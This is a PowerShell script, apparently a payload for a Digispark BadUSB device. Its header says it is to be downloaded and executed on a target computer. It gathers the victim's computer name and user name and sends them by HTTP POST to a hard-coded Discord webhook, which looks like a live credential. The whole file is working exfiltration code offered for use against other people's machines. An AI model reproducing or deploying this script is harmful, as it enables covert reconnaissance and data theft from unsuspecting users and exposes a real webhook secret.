# webhook_reporter_en.ps1
# This script will be downloaded and executed on the target computer.

# !!! REPLACE THIS URL WITH YOUR ACTUAL DISCORD WEBHOOK URL !!!
# Example: 'https://discord.com/api/webhooks/123456789012345678/aBcDeFgHiJkLmNoPqRsTuVwXyZ'
$webhookUrl = 'https://discord.com/api/webhooks/1382033925676994591/fD2Tkr-ggL7QXrjiGs3phMu80IyTcQOPGUBstF4-vmDRVa9prGbeISQFqAGrnFmuq72a'

# Gather system information
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME

# Formulate JSON payload for Discord Webhook
$payload = @{
    username = "Digispark Reporter"
    content = "New report from Digispark!"
    embeds = @(
        @{
            title = "Host Information"
            color = 65280 # Green color in decimal format
            fields = @(
                @{name = "Computer Name"; value = $computerName; inline = $true},
                @{name = "User Name"; value = $userName; inline = $true}
            )
        }
    )
}

# Convert PowerShell object to JSON
$jsonPayload = ConvertTo-Json -InputObject $payload -Depth 4 # Depth 4 for proper nesting

# Send HTTP POST request to Discord webhook
try {
    Invoke-WebRequest -Uri $webhookUrl -Method POST -ContentType 'application/json' -Body $jsonPayload -TimeoutSec 10 -ErrorAction Stop
}
catch {
    # Optional: Add error logging here if needed.
    # Example: Add-Content -Path "$env:TEMP\digispark_error.log" -Value "Error sending report: $($_.Exception.Message)"
}

# (Optional) Close the PowerShell window after script execution
# If PowerShell is run with -NoE, it will remain open.
# If you want the window to close, you can add:
# exit
